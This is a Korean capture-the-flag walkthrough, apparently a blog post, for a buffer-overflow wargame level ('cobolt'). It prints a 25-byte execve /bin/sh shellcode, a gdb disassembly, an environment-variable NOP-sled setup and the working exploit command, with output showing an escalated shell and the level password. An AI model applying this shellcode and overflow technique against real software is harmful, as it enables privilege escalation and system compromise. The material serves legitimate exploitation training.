
25바이트 쉘코드

\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80

시작하기전에 꼭 bash2 설정

@@@@@@
풀이

먼저 로그인을 한후

ls -al 로 먼저 파일들을 확인합니다.

다음 cobolt 파일과 cobolt.c 파일이있는데 먼저 소스파일부터 봅니다.

int main(int argc, char *argv[])
{
    char buffer[16];
    if(argc < 2){
        printf("argv error\n");
        exit(0);
    }
    strcpy(buffer, argv[1]);
    printf("%s\n", buffer);


소스코드를 보면 간단한  strcpy를 이용한 버퍼오버플로우 문제입니다.
이러한 유형의 문제라면 환경변수를 등록해 주소를 찾아

버퍼 + 쉘코드 로 해결할수있습니다.

먼저 버퍼를 알아보자면

[gremlin@localhost gremlin]$ gdb -q cobolt
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
0x8048430 <main>:       push   %ebp
0x8048431 <main+1>:     mov    %ebp,%esp
0x8048433 <main+3>:     sub    %esp,16
0x8048436 <main+6>:     cmp    DWORD PTR [%ebp+8],1
0x804843a <main+10>:    jg     0x8048453 <main+35>
0x804843c <main+12>:    push   0x80484d0
0x8048441 <main+17>:    call   0x8048350 <printf>
0x8048446 <main+22>:    add    %esp,4
0x8048449 <main+25>:    push   0
0x804844b <main+27>:    call   0x8048360 <exit>
0x8048450 <main+32>:    add    %esp,4
0x8048453 <main+35>:    mov    %eax,DWORD PTR [%ebp+12]
0x8048456 <main+38>:    add    %eax,4
0x8048459 <main+41>:    mov    %edx,DWORD PTR [%eax]
0x804845b <main+43>:    push   %edx
0x804845c <main+44>:    lea    %eax,[%ebp-16]
0x804845f <main+47>:    push   %eax
0x8048460 <main+48>:    call   0x8048370 <strcpy>
0x8048465 <main+53>:    add    %esp,8
0x8048468 <main+56>:    lea    %eax,[%ebp-16]
0x804846b <main+59>:    push   %eax
0x804846c <main+60>:    push   0x80484dc

해주면 main+44 쯤에 버퍼가 16바이트 라는것을 알수있습니다. 이로서 우리가 메모리구조를 알게됬는데

총 바이트는 기본 16바이트에 sfb (4바이트) , ret(4바이트) 이므로 ret를 제외한 버퍼는 20바이트입니다.

이제 ret주소만 구해주면되는데.

export code=$(python -c 'print "\x90"*20+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')

이렇게 환경변수를 등록해줍니다.

그리고 vi code.c 를 입력해서 환경변수를 구하는 코드를 짜줍니다.


int main()
{
        printf("%p\n",getenv("code"));
        return 0;
}


그리고 gcc -o aa aa.c 로 컴파일을하고 aa를 실행해주면

ret 주소 0xbffffea6

가 나옵니다. 이제 페이로드를 작성하면 


./cobolt `python -c 'print "\x90"*20+"\xa6\xfe\xff\xbf"'`

해주면

bash$ id
uid=501(gremlin) gid=501(gremlin) euid=502(cobolt) egid=502(cobolt) groups=501(gremlin)
bash$ my-pass
euid = 502
hacking exposed

쉘을 획득할수있다.









